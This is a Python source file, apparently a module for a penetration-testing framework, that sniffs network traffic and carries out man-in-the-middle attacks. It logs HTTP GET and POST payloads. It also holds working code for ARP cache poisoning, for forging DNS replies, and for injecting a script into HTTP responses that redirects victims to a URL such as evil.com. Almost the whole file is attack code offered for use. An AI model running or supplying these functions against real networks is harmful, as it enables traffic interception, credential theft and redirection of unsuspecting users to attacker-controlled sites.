#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import scapy.all as scapy
import threading
import time
import json
import csv
import re
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

MODULE_INFO = {
    "name": "Network Sniffer & Spoofer",
    "description": "Real-time packet capture, ARP/DNS/HTTP spoofing with rich UI",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "Linux",
    "rank": "Excellent",
    "dependencies": ["scapy", "rich"]
}

OPTIONS = {
    "INTERFACE": {
        "description": "Network interface (e.g., eth0, wlan0)",
        "required": True,
        "default": "eth0"
    },
    "FILTER": {
        "description": "BPF filter (e.g., 'tcp port 80', 'host 192.168.1.1')",
        "required": False,
        "default": ""
    },
    "MODE": {
        "description": "sniff, arp_spoof, dns_spoof, http_inject",
        "required": True,
        "default": "sniff"
    },
    "TARGET": {
        "description": "Target IP for spoofing (arp/dns)",
        "required": False,
        "default": ""
    },
    "GATEWAY": {
        "description": "Gateway IP (for ARP spoof)",
        "required": False,
        "default": ""
    },
    "SPOOF_DNS": {
        "description": "Domain=IP (e.g., example.com=1.1.1.1)",
        "required": False,
        "default": ""
    },
    "HTTP_REDIRECT": {
        "description": "Redirect URL (e.g., http://evil.com)",
        "required": False,
        "default": ""
    },
    "EXPORT": {
        "description": "Export formats: json,csv,html",
        "required": False,
        "default": "json,csv,html"
    },
    "TIMEOUT": {
        "description": "Sniff duration in seconds (0 = infinite)",
        "required": False,
        "default": "60"
    }
}

# Global
packets_captured = []
lock = threading.Lock()
stop_sniff = threading.Event()

def run(session, options):
    iface = options.get("INTERFACE", "eth0")
    bpf_filter = options.get("FILTER", "")
    mode = options.get("MODE", "sniff").lower()
    target = options.get("TARGET", "")
    gateway = options.get("GATEWAY", "")
    spoof_dns = options.get("SPOOF_DNS", "")
    http_redirect = options.get("HTTP_REDIRECT", "")
    export_formats = [f.strip().lower() for f in options.get("EXPORT", "json,csv,html").split(",")]
    timeout = int(options.get("TIMEOUT", 60))

    # Validate
    if mode != "sniff" and not target:
        console.print(Panel("[red]TARGET required for spoofing[/red]", border_style="red"))
        return

    console.print(Panel(
        f"[bold cyan]Network Sniffer & Spoofer[/bold cyan]\n\n"
        f"[white]Interface:[/white] [yellow]{iface}[/yellow]\n"
        f"[white]Mode:[/white] [green]{mode.upper()}[/green]\n"
        f"[white]Filter:[/white] [blue]{bpf_filter or 'None'}[/blue]\n"
        f"[white]Target:[/white] [magenta]{target or 'N/A'}[/magenta]\n"
        f"[white]Duration:[/white] [cyan]{timeout}s[/cyan]",
        title="SNIFFER CONFIG",
        border_style="white",
        padding=(1, 2)
    ))

    global packets_captured
    packets_captured = []
    start_time = time.time()

    # Progress
    progress = Progress(
        TextColumn("[bold blue]Capturing[/bold blue]"),
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        "•",
        TextColumn("[green]{task.completed}[/green] packets"),
        "•",
        TimeElapsedColumn(),
        transient=True
    )

    if mode == "sniff":
        with Live(progress, console=console) as live:
            task = progress.add_task("sniff", total=timeout if timeout > 0 else None)
            scapy.sniff(
                iface=iface,
                filter=bpf_filter,
                prn=lambda p: packet_callback(p, progress, task),
                stop_filter=lambda p: stop_sniff.is_set(),
                store=0,
                timeout=timeout if timeout > 0 else None
            )
    elif mode == "arp_spoof":
        console.print(Panel("[yellow]Starting ARP Spoofing...[/yellow]", border_style="yellow"))
        arp_spoof_thread = threading.Thread(target=arp_spoof, args=(target, gateway, iface))
        arp_spoof_thread.daemon = True
        arp_spoof_thread.start()
        with Live(progress, console=console) as live:
            task = progress.add_task("spoof", total=timeout)
            for _ in range(timeout):
                if stop_sniff.is_set(): break
                time.sleep(1)
                progress.update(task, advance=1)
        stop_arp_spoof()
    elif mode == "dns_spoof":
        domain, ip = spoof_dns.split("=") if "=" in spoof_dns else ("", "")
        if not domain or not ip:
            console.print(Panel("[red]SPOOF_DNS format: domain.com=1.1.1.1[/red]", border_style="red"))
            return
        dns_spoof_thread = threading.Thread(target=dns_spoof, args=(iface, domain, ip))
        dns_spoof_thread.daemon = True
        dns_spoof_thread.start()
        console.print(Panel(f"[green]DNS Spoof: {domain} → {ip}[/green]", border_style="green"))
    elif mode == "http_inject":
        if not http_redirect:
            console.print(Panel("[red]HTTP_REDIRECT required[/red]", border_style="red"))
            return
        http_inject_thread = threading.Thread(target=http_inject, args=(iface, http_redirect))
        http_inject_thread.daemon = True
        http_inject_thread.start()
        console.print(Panel(f"[yellow]HTTP Redirect → {http_redirect}[/yellow]", border_style="yellow"))

    # Final
    scan_time = time.time() - start_time
    export_results(packets_captured, mode, export_formats, target or "network")
    display_results(packets_captured, scan_time)

def packet_callback(packet, progress, task):
    if stop_sniff.is_set():
        return

    with lock:
        if packet.haslayer(scapy.IP):
            src = packet[scapy.IP].src
            dst = packet[scapy.IP].dst
            proto = packet[scapy.IP].proto
            size = len(packet)

            payload = ""
            if packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 80:
                if packet.haslayer(scapy.Raw):
                    payload = packet[scapy.Raw].load.decode(errors='ignore')
                    if "GET" in payload or "POST" in payload:
                        console.print(f"[green]HTTP[/] {src} → {dst} | {payload.split()[1]}")

            info = {
                'time': time.strftime("%H:%M:%S"),
                'src': src,
                'dst': dst,
                'proto': {1: "ICMP", 6: "TCP", 17: "UDP"}.get(proto, str(proto)),
                'size': size,
                'payload': payload[:100]
            }
            packets_captured.append(info)
            progress.update(task, advance=1)

            # Real-time print
            console.print(f"[cyan]{info['time']}[/] | [bold]{src}[/] → [bold]{dst}[/] | [magenta]{info['proto']}[/] | {size} B")

def arp_spoof(target, gateway, iface):
    def send_poison(victim, spoofed):
        packet = scapy.ARP(op=2, pdst=victim, hwdst=scapy.getmacbyip(victim), psrc=spoofed)
        scapy.send(packet, verbose=0, iface=iface)

    while not stop_sniff.is_set():
        send_poison(target, gateway)
        send_poison(gateway, target)
        time.sleep(2)

def stop_arp_spoof():
    stop_sniff.set()
    console.print(Panel("[red]ARP Spoof stopped[/red]", border_style="red"))

def dns_spoof(iface, domain, ip):
    def dns_reply(packet):
        if packet.haslayer(scapy.DNSQR) and domain in packet[scapy.DNSQR].qname.decode():
            spoofed = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                     scapy.UDP(dport=packet[scapy.UDP].sport, sport=53) / \
                     scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd,
                              an=scapy.DNSRR(rrname=packet[scapy.DNSQR].qname, ttl=10, rdata=ip))
            scapy.send(spoofed, verbose=0, iface=iface)
    scapy.sniff(iface=iface, filter="udp port 53", prn=dns_reply, store=0)

def http_inject(iface, redirect_url):
    def inject(packet):
        if packet.haslayer(scapy.Raw) and b"HTTP/1.1" in packet[scapy.Raw].load:
            http_payload = packet[scapy.Raw].load
            if b"200 OK" in http_payload:
                new_payload = http_payload.replace(b"</head>", f'<script>window.location="{redirect_url}"</script></head>'.encode())
                new_pkt = packet
                new_pkt[scapy.Raw].load = new_payload
                del new_pkt[scapy.IP].len
                del new_pkt[scapy.IP].chksum
                del new_pkt[scapy.TCP].chksum
                scapy.send(new_pkt, iface=iface, verbose=0)
    scapy.sniff(iface=iface, filter="tcp port 80", prn=inject, store=0)

def export_results(packets, mode, formats, target):
    if not packets:
        return
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    base = f"sniffer_{mode}_{target}_{timestamp}"

    if "json" in formats:
        with open(f"{base}.json", "w") as f:
            json.dump(packets, f, indent=2)
        console.print(f"[green]JSON: {base}.json[/green]")

    if "csv" in formats:
        with open(f"{base}.csv", "w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=["time","src","dst","proto","size","payload"])
            w.writeheader()
            w.writerows(packets)
        console.print(f"[green]CSV: {base}.csv[/green]")

    if "html" in formats:
        html = f"""<!DOCTYPE html><html><head><title>Sniffer Report</title><style>
            body {{font-family:Arial;background:#111;color:#0f0;margin:40px}}
            .c {{max-width:1200px;margin:auto;background:#000;padding:20px;border:1px solid #0f0;border-radius:10px}}
            table {{width:100%;border-collapse:collapse}}
            th,td {{padding:8px;border:1px solid #0f0;text-align:left}}
            th {{background:#003300}}
        </style></head><body><div class="c">
        <h1>NETWORK SNIFFER REPORT</h1>
        <p>Mode: {mode.upper()} | Packets: {len(packets)}</p>
        <table><tr><th>Time</th><th>Src</th><th>Dst</th><th>Proto</th><th>Size</th><th>Payload</th></tr>"""
        for p in packets[:100]:
            html += f"<tr><td>{p['time']}</td><td>{p['src']}</td><td>{p['dst']}</td><td>{p['proto']}</td><td>{p['size']}</td><td>{p['payload']}</td></tr>"
        html += "</table></div></body></html>"
        with open(f"{base}.html", "w") as f:
            f.write(html)
        console.print(f"[green]HTML: {base}.html[/green]")

def display_results(packets, duration):
    if not packets:
        console.print(Panel("[yellow]No packets captured[/yellow]", border_style="yellow"))
        return

    table = Table(title=f"[*] {len(packets)} Packets Captured", box=box.ROUNDED)
    table.add_column("Time", style="cyan")
    table.add_column("Source", style="green")
    table.add_column("Dest", style="red")
    table.add_column("Proto", style="magenta")
    table.add_column("Size", style="yellow")

    for p in packets[:20]:
        table.add_row(p['time'], p['src'], p['dst'], p['proto'], str(p['size']))

    console.print(table)
    console.print(Panel(
        f"[bold green]CAPTURE COMPLETE[/bold green]\n"
        f"Packets: [green]{len(packets)}[/green] | "
        f"Duration: [yellow]{duration:.1f}s[/yellow]",
        border_style="green"
    ))

if __name__ == "__main__":
    console.print(Panel(
        "[bold green][*] Network Sniffer & Spoofer [*][/bold green]\n\n"
        "[yellow]Usage:[/yellow]\n"
        "  use scanner/net_sniffer_spoofer\n"
        "  set INTERFACE wlan0\n"
        "  set MODE sniff\n"
        "  set FILTER 'tcp port 80'\n"
        "  run\n\n"
        "[dim]Requires root for spoofing[/dim]",
        title="MODULE READY",
        border_style="white"
    ))
